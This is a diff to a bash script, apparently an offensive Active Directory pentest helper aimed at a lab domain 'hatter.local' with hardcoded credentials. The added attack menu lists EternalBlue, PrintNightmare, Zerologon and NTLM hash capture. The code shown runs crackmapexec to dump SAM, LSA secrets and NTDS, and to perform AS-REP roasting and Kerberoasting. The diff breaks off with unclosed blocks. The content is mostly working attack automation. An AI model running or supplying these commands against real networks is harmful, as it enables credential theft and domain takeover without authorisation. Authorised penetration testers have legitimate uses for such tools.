@@ -2,7 +2,7 @@
 
 #IF UNKNOWN LEAVE BLANK
 DOMAINIP="192.168.0.44"
-DOMAIN="" 
+DOMAIN="hatter.local" 
 USER="alice"
 PASS="P@ssw0rd1"
 NTHASH="" #if you have an NT has put here
@@ -114,18 +114,18 @@ if [ $answer == 1 ]; then
 	fi
 
 	echo "
-	1) RustScan
-	2) NMAP
-	3) Kerberos Username Spray with Kerbrute (Need kerbrute installed, if not installed rerun script and install package)
-	4) GetNPUsers Username Spray to drop crackable hash
-	5) Anonymous login RPC Client
-	6) Anonymous LDAP Domain Dump
-	7) Mount SMB Share with no username / password
-	8) Enum4Linux
-	9) FTP Server anonymous Login
+	1)  RustScan
+	2)  NMAP
+	3)  Kerberos Username Spray with Kerbrute (Need kerbrute installed, if not installed rerun script and install package)
+	4)  GetNPUsers Username Spray to drop crackable hash
+	5)  Anonymous login RPC Client
+	6)  Anonymous LDAP Domain Dump
+	7)  Mount SMB Share with no username / password
+	8)  Enum4Linux
+	9)  FTP Server anonymous Login
 	10) Run some differnet Impacket Enumeartion Scripts
-	A) Auto Enumeration (Let the script run everything)
-	T) Listen to Trapt (You know I had to put some music in here...)
+	A)  Auto Enumeration (Let the script run everything)
+	T)  Listen to Trapt (You know I had to put some music in here...)
 	99) exit
 	"
 	read -p "Please pick one of the above: " answer
@@ -342,10 +342,115 @@ if [ $answer == 1 ]; then
 fi
 
 if [ $answer == 2 ]; then
+
+	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
+	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
+	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
+	RPC="""rpcclient -U "" -N $DOMAINIP"""
+	RPCWPASS="rpcclient -U $USER -P $PASS $DOMAINIP"
+	RPCCOMMAND="-c enumdomusers,enumdomgroups > RPC.txt"
+	LDAPMKDIR="mkdir LDAP"
+	LDAP="ldapdomaindump ldap://$DOMAINIP:389"
+	LDAPWPASS="ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP"
+	SMBMKDIR="mkdir SMB"
+	SMB="sudo mount -t cifs //$DOMAINIP/$SMBLOCATION smb"
+	SMBWPASS="sudo mount -t cifs -o user=$USER //$DOMAINIP/"
+	ENUM4="enum4linux $DOMAINIP"
+	FTP="ftp $DOMAINIP"
+	CRACKSMB="crackmapexec smb $DOMAINIP -u $USER -p $PASS"
+	CRACKLDAP="crackmapexec ldap $DOMAINIP -u $USER -p $PASS "
+	IMP="Impacket.txt"
+	I=impacket
+
 	$R"Attacking System"; $RE
 	if [ -z "${DOMAINIP}" ] || [ -z "${DOMAIN}" ]; then
 		$Y"Need an IP address or domain to attack, please update in script";$RE
 		exit
 	fi
+	ls $DOMAINIP.txt
+	if [ $? != 0 ]; then
+		$G"NMAP / RustScan was never ran, running now"; $RE
+		$RUST > $DOMAINIP.txt
+	fi
 
-fi
+	echo "
+	1)  CrackMapExec (Runs different crackmapexec tools)
+	2)  SMBKiller (Runs SMBKiller Script which is for retrieving a NTLM hash from an SMB file)
+	3)  SMB Attacks (Runs different attacks such as Eternal Blue and MS09-050)
+	4)  Impacket Tools (Will run different impacket scripts)
+	5)  Bloodhound (Run bloodhound-python on the target machine)
+	6)  LDAP Domain Dump with Username and Password
+	7)  Mount SMB with Username and Password
+	8)  Mount FTP with Username and Password
+	9)  Create .lnk to retrieve NTLM hashes from SMB Server
+	10) Print Nightmare
+	11) Zero Logon
+	A)  Auto Attack (Let the script do its thing)
+	T)  Listen to Tool (You know I had to put some music in here...)
+	99) exit
+	"
+	read -p "Please pick one of the above: " answer
+	if [ $answer == 99 ]; then
+		exit
+	fi
+	if [ $answer == 1 ]; then
+		$R"Running some CrackMapExec stuff, saving to $IMP"; $RE
+		ls $IMP
+		if [ $? != 0 ]; then
+			touch impacket.txt
+		fi
+		$G"Running against SMB"; $RE
+		$CRACKSMB --shares >> $IMP
+		$CRACKSMB --sessions >> $IMP
+		$CRACKSMB --disks >> $IMP
+		$CRACKSMB --loggedon-users >> $IMP
+		$CRACKSMB --users >> $IMP
+		$CRACKSMB --groups >> $IMP
+		$CRACKSMB --computers >> $IMP
+		$CRACKSMB --sam >> $IMP
+		$CRACKSMB --lsa >> $IMP
+		$CRACKSMB --ntds >> $IMP
+		$C"Running against LDAP"; $RE
+		$CRACKLDAP --asreproast >> $IMP
+		$CRACKLDAP --kerberoasting >> $IMP
+		$CRACKLDAP --trusted-for-delegation >> $IMP
+		$CRACKLDAP --password-not-required >> $IMP
+		$CRACKLDAP --admin-count >> $IMP
+		$CRACKLDAP --users >> $IMP
+		$CRACKLDAP --groups >> $IMP
+
+
+	if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
+		$R""; $RE
+		sleep 10
+	fi
+	if grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
+		$R"Most likley vulnerable to MS09-050, can explot if Attack is used"; $RE
+		sleep 10
+	fi
+	if [ $answer == A ]; then
+
+
+###################################### LEAVE CRACK MAP EXEC AT THE BOTTOM OR IT WILL MESS WITH STUFF ##################################################################
+
+
+		if [ $? != 0 ]; then
+			touch impacket.txt
+		fi
+		$CRACKSMB --shares >> $IMP
+		$CRACKSMB --sessions >> $IMP
+		$CRACKSMB --disks >> $IMP
+		$CRACKSMB --loggedon-users >> $IMP
+		$CRACKSMB --users >> $IMP
+		$CRACKSMB --groups >> $IMP
+		$CRACKSMB --computers >> $IMP
+		$CRACKSMB --sam >> $IMP
+		$CRACKSMB --lsa >> $IMP
+		$CRACKSMB --ntds >> $IMP
+		$CRACKLDAP --asreproast >> $IMP
+		$CRACKLDAP --kerberoasting >> $IMP
+		$CRACKLDAP --trusted-for-delegation >> $IMP
+		$CRACKLDAP --password-not-required >> $IMP
+		$CRACKLDAP --admin-count >> $IMP
+		$CRACKLDAP --users >> $IMP
+		$CRACKLDAP --groups >> $IMP
